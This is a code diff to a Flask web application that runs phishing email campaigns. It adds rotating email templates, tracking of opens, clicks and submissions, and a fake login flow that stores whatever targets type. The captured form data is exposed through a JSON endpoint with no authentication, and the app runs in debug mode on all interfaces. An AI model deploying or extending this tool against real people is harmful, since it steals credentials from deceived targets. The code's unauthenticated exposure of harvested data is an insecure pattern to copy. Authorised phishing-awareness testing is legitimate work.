@@ -1,10 +1,11 @@
 from flask import Flask, render_template, request, redirect, url_for, send_file, abort, session, Response, flash, jsonify
 from functools import wraps
 from config import Config
-from models import db, Campaign, Target, Event, FormData
+from models import db, Campaign, Target, Event, FormData, EmailTemplate
 from email_service import send_campaign_email
 import uuid
 import io
+import random
 import datetime
 import csv
 from io import StringIO
@@ -55,7 +56,8 @@ def admin_logout():
 @admin_required
 def dashboard():
     campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
-    return render_template('dashboard.html', campaigns=campaigns)
+    templates = EmailTemplate.query.order_by(EmailTemplate.name).all()
+    return render_template('dashboard.html', campaigns=campaigns, templates=templates)
 
 @app.route('/campaign/<int:campaign_id>')
 @admin_required
@@ -189,18 +191,25 @@ def settings_clear_data():
 
 @app.route('/send', methods=['POST'])
 def send_emails():
-    sender_email = request.form.get('sender_email')
-    sender_password = request.form.get('sender_password')
-    subject = request.form.get('subject')
-    body = request.form.get('body')
-    recipient_list = request.form.get('recipients').splitlines()
-    recipient_list = [r.strip() for r in recipient_list if r.strip()]
+    sender_email    = request.form.get('sender_email', '').strip()
+    sender_password = request.form.get('sender_password', '').strip()
+    subject         = request.form.get('subject', '').strip() or None
+    body            = request.form.get('body', '').strip() or None
+    recipient_list  = request.form.get('recipients', '').splitlines()
+    recipient_list  = [r.strip() for r in recipient_list if r.strip()]
+    template_ids    = request.form.getlist('template_ids')  # list of str IDs
 
     if not sender_email or not sender_password or not recipient_list:
-        return "Missing details", 400
+        flash('Missing sender credentials or recipient list.', 'error')
+        return redirect(url_for('dashboard'))
+
+    # If no templates selected and no manual subject/body, block
+    if not template_ids and (not subject or not body):
+        flash('Provide a Subject + Body or select at least one template.', 'error')
+        return redirect(url_for('dashboard'))
 
     public_url = (request.form.get('public_url') or '').strip().rstrip('/')
-    host_url = public_url if public_url else request.url_root.rstrip('/')
+    host_url   = public_url if public_url else request.url_root.rstrip('/')
 
     new_campaign = Campaign(
         sender_email=sender_email,
@@ -210,38 +219,95 @@ def send_emails():
         host_url=host_url,
         redirect_url=request.form.get('redirect_url', '').strip() or None
     )
+
+    # Link selected templates to the campaign
+    if template_ids:
+        linked = EmailTemplate.query.filter(EmailTemplate.id.in_(
+            [int(i) for i in template_ids if str(i).isdigit()]
+        )).all()
+        new_campaign.templates = linked
+
     db.session.add(new_campaign)
     db.session.commit()
 
     for email in recipient_list:
         tracking_id = str(uuid.uuid4())
-        target = Target(email=email, tracking_id=tracking_id, campaign_id=new_campaign.id, status='Pending')
+        target = Target(email=email, tracking_id=tracking_id,
+                        campaign_id=new_campaign.id, status='Pending')
         db.session.add(target)
     db.session.commit()
 
     return redirect(url_for('campaign_details', campaign_id=new_campaign.id))
 
+@app.route('/api/campaign/<int:campaign_id>/status')
+def campaign_status(campaign_id):
+    campaign = Campaign.query.get_or_404(campaign_id)
+    targets = []
+    for t in campaign.targets:
+        opens   = sum(1 for e in t.events if e.type == 'open')
+        clicks  = sum(1 for e in t.events if e.type == 'click')
+        submits = sum(1 for e in t.events if e.type == 'submit')
+        captured = t.form_data[0].data if t.form_data else None
+        targets.append({
+            'id':       t.id,
+            'email':    t.email,
+            'status':   t.status or 'Pending',
+            'opens':    opens,
+            'clicks':   clicks,
+            'submits':  submits,
+            'captured': captured,
+        })
+    return jsonify({'targets': targets})
+
 @app.route('/api/send_target/<int:target_id>', methods=['POST'])
 def send_single_target(target_id):
-    target = Target.query.get_or_404(target_id)
+    target   = Target.query.get_or_404(target_id)
     campaign = target.campaign
 
     if not campaign.sender_email or not campaign.sender_password:
         return {'success': False, 'message': 'Missing credentials'}, 400
+
+    # Pick a random template if the campaign has any linked,
+    # OR fall back to any available template if campaign subject/body are empty
+    used_tpl = None
+    linked_templates = campaign.templates
+
+    if linked_templates:
+        used_tpl = random.choice(linked_templates)
+    elif not campaign.subject or not campaign.body:
+        # No templates explicitly linked but subject/body missing — try all templates
+        all_templates = EmailTemplate.query.all()
+        if all_templates:
+            used_tpl = random.choice(all_templates)
+
+    if used_tpl:
+        subject = used_tpl.subject
+        body    = used_tpl.body
+        target.template_id = used_tpl.id
+    else:
+        subject = campaign.subject
+        body    = campaign.body
+
+    if not subject or not body:
+        return {'success': False, 'message': 'No subject/body and no templates configured'}, 400
 
     try:
         success = send_campaign_email(
             campaign.sender_email,
             campaign.sender_password,
             target.email,
-            campaign.subject,
-            campaign.body,
+            subject,
+            body,
             target.tracking_id,
             campaign.host_url
         )
         target.status = 'Sent' if success else 'Failed'
         db.session.commit()
-        return {'success': success, 'status': target.status}
+        return {
+            'success': success,
+            'status': target.status,
+            'template': used_tpl.name if used_tpl else 'default'
+        }
     except Exception as e:
         target.status = 'Error'
         db.session.commit()
@@ -267,10 +333,19 @@ def masked_click():
     target = Target.query.filter_by(tracking_id=t).first()
     if not target:
         return redirect('https://microsoft.com')
-    event = Event(type='click', target_id=target.id,
-                  ip_address=request.remote_addr,
-                  user_agent=request.user_agent.string)
-    db.session.add(event)
+
+    # Infer "open" from click — pixel is often blocked by email clients
+    already_opened = Event.query.filter_by(target_id=target.id, type='open').first()
+    if not already_opened:
+        open_event = Event(type='open', target_id=target.id,
+                           ip_address=request.remote_addr,
+                           user_agent=request.user_agent.string)
+        db.session.add(open_event)
+
+    click_event = Event(type='click', target_id=target.id,
+                        ip_address=request.remote_addr,
+                        user_agent=request.user_agent.string)
+    db.session.add(click_event)
     db.session.commit()
     host = target.campaign.host_url or request.url_root.rstrip('/')
     return redirect(f"{host}/login/{t}")
@@ -286,10 +361,24 @@ def submit_data(tracking_id):
     data = request.form.to_dict()
     form_data = FormData(data=data, target_id=target.id)
     db.session.add(form_data)
-    event = Event(type='submit', target_id=target.id,
-                  ip_address=request.remote_addr,
-                  user_agent=request.user_agent.string)
-    db.session.add(event)
+
+    # Ensure open is recorded even if pixel was blocked
+    already_opened = Event.query.filter_by(target_id=target.id, type='open').first()
+    if not already_opened:
+        db.session.add(Event(type='open', target_id=target.id,
+                             ip_address=request.remote_addr,
+                             user_agent=request.user_agent.string))
+
+    # Ensure click is recorded even if /account/verify was skipped somehow
+    already_clicked = Event.query.filter_by(target_id=target.id, type='click').first()
+    if not already_clicked:
+        db.session.add(Event(type='click', target_id=target.id,
+                             ip_address=request.remote_addr,
+                             user_agent=request.user_agent.string))
+
+    db.session.add(Event(type='submit', target_id=target.id,
+                         ip_address=request.remote_addr,
+                         user_agent=request.user_agent.string))
     db.session.commit()
     campaign = target.campaign
     if campaign and campaign.redirect_url:
@@ -312,13 +401,14 @@ def export_campaign(campaign_id):
     campaign = Campaign.query.get_or_404(campaign_id)
     si = StringIO()
     cw = csv.writer(si)
-    cw.writerow(['Email', 'Status', 'Tracking ID', 'Opened', 'Clicked', 'Data Submitted', 'Captured Data'])
+    cw.writerow(['Email', 'Status', 'Template Used', 'Tracking ID', 'Opened', 'Clicked', 'Data Submitted', 'Captured Data'])
     for target in campaign.targets:
-        opens = [e for e in target.events if e.type == 'open']
-        clicks = [e for e in target.events if e.type == 'click']
+        opens   = [e for e in target.events if e.type == 'open']
+        clicks  = [e for e in target.events if e.type == 'click']
         submits = [e for e in target.events if e.type == 'submit']
+        tpl_name = EmailTemplate.query.get(target.template_id).name if target.template_id else 'default'
         data_str = str(target.form_data[0].data) if target.form_data else ''
-        cw.writerow([target.email, target.status, target.tracking_id,
+        cw.writerow([target.email, target.status, tpl_name, target.tracking_id,
                      'Yes' if opens else 'No',
                      'Yes' if clicks else 'No',
                      'Yes' if submits else 'No',
@@ -328,5 +418,44 @@ def export_campaign(campaign_id):
     output.headers["Content-type"] = "text/csv"
     return output
 
+# ─── Template Library CRUD ────────────────────────────────────────────────────
+
+@app.route('/templates')
+@admin_required
+def templates_list():
+    templates = EmailTemplate.query.order_by(EmailTemplate.created_at.desc()).all()
+    return render_template('templates.html', templates=templates)
+
+@app.route('/templates/new', methods=['POST'])
+@admin_required
+def template_new():
+    name    = request.form.get('name', '').strip()
+    subject = request.form.get('subject', '').strip()
+    body    = request.form.get('body', '').strip()
+    if not name or not subject or not body:
+        return redirect(url_for('templates_list'))
+    tpl = EmailTemplate(name=name, subject=subject, body=body)
+    db.session.add(tpl)
+    db.session.commit()
+    return redirect(url_for('templates_list'))
+
+@app.route('/templates/<int:tpl_id>/edit', methods=['POST'])
+@admin_required
+def template_edit(tpl_id):
+    tpl = EmailTemplate.query.get_or_404(tpl_id)
+    tpl.name    = request.form.get('name', tpl.name).strip()
+    tpl.subject = request.form.get('subject', tpl.subject).strip()
+    tpl.body    = request.form.get('body', tpl.body).strip()
+    db.session.commit()
+    return redirect(url_for('templates_list'))
+
+@app.route('/templates/<int:tpl_id>/delete', methods=['POST'])
+@admin_required
+def template_delete(tpl_id):
+    tpl = EmailTemplate.query.get_or_404(tpl_id)
+    db.session.delete(tpl)
+    db.session.commit()
+    return redirect(url_for('templates_list'))
+
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    app.run(debug=True, host='0.0.0.0', port=5000, threaded=True)
